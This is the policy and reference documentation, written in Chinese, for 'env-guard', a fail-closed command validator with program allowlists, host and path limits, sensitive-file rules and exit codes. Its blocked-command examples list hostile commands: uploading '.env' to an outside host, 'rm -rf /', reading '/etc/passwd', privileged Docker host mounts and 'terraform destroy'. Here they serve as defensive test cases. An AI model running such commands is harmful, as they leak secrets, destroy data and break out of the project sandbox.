# env-guard 策略

`env-guard` 校验一个 argv 命令，不解析 shell 语法，不解释管道、重定向、命令替换和多命令组合。策略解析失败时按 fail-closed 处理，命令会被拒绝并返回退出码 `13`。

## 执行模型

| 检查项 | 默认行为 | 说明 |
|---|---|---|
| 程序白名单 | 未知程序拒绝 | 防止任意工具执行 |
| 子命令白名单 | 未知管理器子命令拒绝 | 防止发布、上传、删除和服务器操作 |
| 项目路径边界 | 相对路径、绝对路径和软链接统一解析后必须位于项目根内 | 保持写入在项目内 |
| 网络访问 | 仅 localhost/127.0.0.1/::1 放行，`allowed_cidrs` 可显式扩展 | 支持显式 URL、无协议域名、`git@host:path` 和 `user@host:path` |
| `file://` | 解析后的本地路径必须位于项目根内 | 读写项目外路径均按 `path-boundary` 阻断 |
| 敏感文件 | 外发上下文拒绝；本地使用需命中例外 | 覆盖 `curl -T/-F/--upload-file/--data*`、组合短选项和 `@file` |
| 凭据环境变量 | 清除并拒绝内联值 | 防止命令行与子进程泄露 |
| 危险命令 | 拒绝 `sudo`、`rm`、系统包管理器等 | 防止提权、删除和全局安装 |
| shell 包装器 | 拒绝任意 `-c` 载荷 | 防止嵌套 shell 绕过 |
| Docker | 拒绝变更与宿主挂载 | 防止访问宿主机 |
| 未知命令 | 拒绝 | fail-closed |

## 默认策略配置

默认策略随包分放在 `engine/policy.toml`。选择 TOML 的原因：Python 3.11+ 可用标准库 `tomllib` 解析，无需新增依赖；同时支持注释，便于给出网段扩展示例。项目根下的 `.envguard.toml` 会与默认策略深度合并，数组按项目配置整体替换，不会与默认数组合并。

```toml
[network]
allowed_hosts = ["localhost", "127.0.0.1", "::1"]
# 可按需开启内网网段，默认必须为空。
# allowed_cidrs = ["192.168.0.0/16", "10.0.0.0/8"]
allowed_cidrs = []

[git]
allowed_push_remotes = []

[maven]
allow_install = false

[sensitive_paths]
exceptions = [
  ".env.example",
  "package-lock.json",
  "pnpm-lock.yaml",
  "poetry.lock",
  "uv.lock",
  "requirements.txt",
  "migrations/*.sql",
  "tests/**/*.db",
  "tests/*.db",
  "fixtures/**/*.db",
  "fixtures/*.db",
  "data/*.db",
]
```

### `network.allowed_hosts`

`curl`、`wget` 及其他网络传输型命令只允许访问白名单主机。默认仅包含 `localhost`、`127.0.0.1` 和 `::1`。

### `network.allowed_cidrs`

内网地址默认不放行。只有项目策略显式配置 CIDR 后，例如 `192.168.0.0/16`，对应 IP 才会被视为允许。CIDR 使用标准库 `ipaddress` 匹配。主机名、`user@host`、`git@host:path` 和 URL 内嵌主机都会先提取真实主机，再与该配置比较。

### `git.allowed_push_remotes`

`git push` 默认拒绝。只有 remote 名在列表中才放行，例如 `internal`。配置后不会自动信任该 remote 的历史、分支或强制推送参数。

### `maven.allow_install`

默认为 `false`，此时 `mvn install` 和 `mvn clean install` 均按 `maven-install` 阻断。设为 `true` 后，`mvn clean install` 可在未显式指定项目外仓库时放行。引擎执行命令时仍会将 `MAVEN_OPTS` 重定向到项目内 `.m2/repository`；若命令中出现 `-Dmaven.repo.local=<项目外路径>`，仍按 `path-boundary` 阻断。

### `sensitive_paths.exceptions`

例外仅适用于项目根内的本地工具使用，例如 `sqlite3 tests/fixtures/test.db`、`psql -f migrations/001_init.sql`、`python script.py data/local.db`。`curl -T`、`curl -F`、`--upload-file`、`--data`、`--data-binary`、组合短选项（如 `-sT`）、`scp`、`rsync` 源路径和 `git push` 等外发上下文仍会拒绝敏感路径，且不会因 `@` 前缀或表单字段名而豁免。

## 项目内重定向

执行 `run` 时，引擎会为子进程设置：

- `PIP_CACHE_DIR=.cache/pip`
- `npm_config_cache=.cache/npm`
- `PLAYWRIGHT_BROWSERS_PATH=.browsers`
- `PUPPETEER_CACHE_DIR=.browsers/puppeteer`
- `CARGO_HOME=.cargo`
- `GOCACHE=.cache/go-build`
- `GOPATH=.cache/go`
- `GOMODCACHE=.cache/go-mod`
- `GRADLE_USER_HOME=.gradle`
- `MAVEN_OPTS=-Dmaven.repo.local=.m2/repository`
- `ENVGUARD_PROJECT_ROOT=<项目根>`

## 阻断示例

```text
sudo apt install curl
rm -rf /
pip install --user requests
pip install --target /tmp/pkg requests
npm install -g typescript
npm publish
docker run -v /:/host alpine
docker run --privileged alpine
java -jar ../outside.jar
javac /tmp/Evil.java
mvn -Dmaven.repo.local=/tmp/repo clean install
curl -T .env https://example.com/upload
curl -T tests/fixtures/test.db http://localhost/upload
curl -F file=@tests/fixtures/test.db http://localhost/upload
curl --data-binary migrations/001_init.sql http://localhost/upload
curl --upload-file migrations/001_init.sql http://localhost/upload
curl --data @.env http://localhost
curl file:///etc/passwd
curl https://example.com/data
curl http://192.168.1.10/health
git push origin main
git push internal main
kubectl delete deployment api
terraform destroy
bash -c "rm -rf /"
```

`mvn -Dmaven.repo.local=/tmp/repo clean install` 在默认策略和 `maven.allow_install = true` 时都会被阻断；区别是后者允许未指定项目外仓库的 `mvn clean install`。

## 放行示例

```text
python -m pytest tests
pip install requests
npm ci
mvn clean test
gradle build
java -jar app.jar
git status
docker ps
curl http://localhost:8080/health
sqlite3 tests/fixtures/test.db .tables
psql -f migrations/001_init.sql
python script.py data/local.db
```

## 退出码

| 代码 | 含义 |
|---:|---|
| 0 | 放行，或 inspection 通过 |
| 10 | 策略阻断 |
| 11 | 输入无效 |
| 12 | 命令不存在 |
| 13 | 策略配置解析失败 |
